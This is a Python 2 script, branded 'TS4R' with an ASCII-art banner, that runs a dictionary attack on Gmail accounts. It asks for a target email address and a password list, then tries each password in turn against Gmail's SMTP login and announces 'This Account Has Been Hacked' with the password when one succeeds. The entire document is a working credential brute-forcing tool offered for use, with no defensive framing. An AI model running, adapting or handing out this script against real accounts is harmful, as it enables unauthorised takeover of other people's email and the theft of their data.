#!/usr/bin/python
'''EDITED BY TS4R'''

import smtplib
from os import system

def main():
   print '================================================='
   print '               EDIT BY TS4R                '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '  _,.                                            '
   print '                                                 '
   print '                                                 '
   print '           TS-4R                               '
   print '________________.e$$$$$$.____'
   print '_______._______e$$$$$$$$$____'
   print '____e$$$$e____$$$$$$$$$$$$___'
   print '___$$$$$$$u__u$$$$$$$$$$$$___'
   print '__e$$$$$$$$__$$$$$$$$$$$$$___'
   print '__$$$$$$$$$__$$$$$$$$$$$$$___'
   print '__$$$$$$$$?__$$$$$$$$$$$$____'
   print '__$$$$$$$$___$$$$$$$$$$$?____'
   print '__$$$$$$$_____$$$$$$$$$______'
   print '___$$$$*_______*$$$$*?_______'
   print '_$___________________________'
   print '_$e__________________________'
   print '_?$$______________________e$_'
   print '__?$$u_________________.e$$__'
   print '___?$$$e.___________.e$$$*___'
   print '_____*$$$$$eeeeee$$$$$$$?____'
   print '_______?$$$$$$$$$$$$$*_______'
   print '_____________________________'

main()
print '[1] start the attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
